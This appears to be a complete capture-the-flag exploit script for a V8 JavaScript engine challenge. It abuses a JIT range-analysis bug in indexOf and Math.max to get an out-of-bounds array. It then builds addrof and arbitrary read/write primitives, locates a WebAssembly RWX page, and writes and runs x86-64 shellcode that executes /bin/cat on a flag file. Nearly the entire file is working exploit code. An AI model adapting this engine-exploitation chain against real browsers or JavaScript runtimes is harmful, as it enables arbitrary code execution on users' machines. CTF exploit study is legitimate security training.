//cat exploit.js | nc shouldve-had-a-v8.chal.uiuc.tf 1337
/* -----------------------------General helper functions to convert to hex, float to int and int to double----------------------------- */
var buf = new ArrayBuffer(8) // 8 byte array buffer
var f64_buf = new Float64Array(buf)
var u64_buf = new Uint32Array(buf)

function hex(val){    // input -> int, output -> hex-string
    return "0x"+val.toString(16)
}

function ftoi(val) {  // input -> float number, output -> integer
    f64_buf[0] = val
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n)
}

function itof(val) {  // input -> int, output -> float
    u64_buf[0] = Number(val & 0xffffffffn)
    u64_buf[1] = Number(val >> 32n)
    return f64_buf[0]
}

/* -----------------------------Real exploit starts here----------------------------- */
//kmaxlen = 536870888

function oob_read_opt(c) {
  const s = "AAAAA";
  let bad = s.indexOf(c);
  //Actual = -1, Range = [0, 536870888]
  bad = Math.max(bad, 536870880);
  //-1, [536870880, 536870888]
  bad = bad - 536870880;
  //-536870881, [0, 8]
  bad >>= 30;
  //-1, [0, 0]
  bad *= 5;
  //-5, [0, 0]
  bad = bad + 4;
  //-1, [4, 4]
  //return bad;
  let evil = new Array(bad);
  evil[0] = 13.37;
  let obj_arr = [evil, 1.1];  //idx 7 elemnt start
  let poor = [1.1, 2.2];
  
  return [evil, poor, obj_arr];
}

/* Optimize the function oob_read_opt() */
for (i = 0; i < 0x10000; i++)  oob_read_opt("B");

[leet, noob, obj_arr] = oob_read_opt("B");
//var float_map = ftoi(leet[13]) & 0xffffffffn
//print("[+]FLOAT_MAP: " + hex(float_map))
//for (i = 0; i < 20 ; i++) print(i + ":\t" + hex(ftoi(leet[i])));

function addrof(obj) {
  obj_arr[0] = obj;
  return ftoi(leet[7]) & 0xffffffffn;
}

function heap_read(addr) {
  addr |= 1n;
  addr -= 8n;
  leet[14] = itof((4n << 32n) + addr);
  return ftoi(noob[0]);
}

function heap_write(addr, val) {
  addr |= 1n;
  addr -= 8n;
  leet[14] = itof((4n << 32n) + addr);
  noob[0] = itof(val);
  return;
}

/* -----------------------------Common shellcode writing part----------------------------- */
d = new ArrayBuffer(0x80);

//print("[+]Addr of d: " + hex(addrof(d)));
print("[+] Heap leak --> *" + hex(addrof(d)) + " - 5n + 0x18n: " + hex(heap_read(addrof(d) - 5n + 0x18n)))

littleEndian = true;
bigEndian = false;

function arb_write(addr, data, littleEndian) {
  let dataview = new DataView(d);
  heap_write(addrof(d) - 5n + 0x18n, addr);
  dataview.setBigUint64(0, data, littleEndian); 
}

shellcode = [0x9090909090909090n, 0x4831D25248BB2F62n, 0x696E2F6361745354n, 0x5F5248BB74000000n, 0x0000000053909090n, 0x909048BB2F666C61n, 0x672E747853545E52n, 0x5657545E4831C0B0n, 0x3B0F059090909090n];
/*
0:  48 31 d2                xor    rdx,rdx
3:  52                      push   rdx
4:  48 bb 2f 62 69 6e 2f    movabs rbx,0x7461632f6e69622f   ;"/bin/cat"
b:  63 61 74
e:  53                      push   rbx
f:  54                      push   rsp
10: 5f                      pop    rdi
11: 52                      push   rdx

xx: 48 bb 74 00 00 00 00    movabs rbx,0x0000000000000074   ;"t"
xx: 00 00 00
xx: 53                      push   rbx

12: 48 bb 2f 66 6c 61 67    movabs rbx,0x78742e67616c662f   ;"/flag.tx"
19: 2e 74 78
1c: 53                      push   rbx
1d: 54                      push   rsp
1e: 5e                      pop    rsi
1f: 52                      push   rdx
20: 56                      push   rsi
21: 57                      push   rdi
22: 54                      push   rsp
23: 5e                      pop    rsi
24: 48 31 c0                xor    rax,rax
27: b0 3b                   mov    al,0x3b
29: 0f 05                   syscall               ;execve("/bin/cat", ["/bin/cat", "/flag.txt", NULL], NULL)
*/

//https://wasdk.github.io/WasmFiddle
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);

shellcode_addr = heap_read(addrof(wasmInstance) - 0x8212069n + 0x82120d0n);
print("[+] RWX addrss: " + hex(shellcode_addr));

let shcode_writer = new DataView(d);
heap_write(addrof(d) - 5n + 0x18n, shellcode_addr);

print("[+] Writing shellcode...");
for (let i = 0n ; i < shellcode.length ; i++) {
  arb_write(shellcode_addr + i*8n, BigInt(shellcode[i]), bigEndian);
}

print("[+] Printing flag...");
wasmInstance.exports.main();

// END